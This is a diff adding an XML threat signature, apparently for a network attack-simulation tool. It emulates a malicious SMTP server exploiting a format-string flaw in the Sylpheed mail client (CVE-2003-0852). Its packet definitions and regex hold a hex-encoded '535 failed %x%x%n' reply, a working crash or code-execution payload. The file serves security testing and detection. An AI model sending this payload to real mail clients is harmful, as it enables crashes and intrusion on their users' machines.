@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="SMTP Server Error Message Format String Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat mimics the behaviour of a malicious SMTP server attempting to crash or cause code execution on a mail client sending email.  This can be used with other attacks, such as redirection, to cause code execution on a client.  SMTP servers typically listen on port 25.  This threat is a client attack that comes from the virtual server. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="SMTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="MUA"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Sylpheed"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Sylpheed"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Sylpheed_0.9.6"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.guninski.com/sylph.html"/>
+    <CVEID display="true" value="CVE-2003-0852"/>
+    <bugtraqID display="true" value="8877"/>
+    <OSVDB display="true" value="8332"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="a784e7a9d01521e758958b27bf240700"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1211993824"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="C"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X35\X33\X35\X20\X66\X61\X69\X6c\X65\X64\X20\X25\X78\X25\X78\X25\X6e\X0d\X0a"/>
+    <Created value="1139462459" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="H"/>
+    <NamedVar name="SMTPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="C"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026, 65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="68656c6f206d61696c0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="353335206661696c65642025782578256e0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
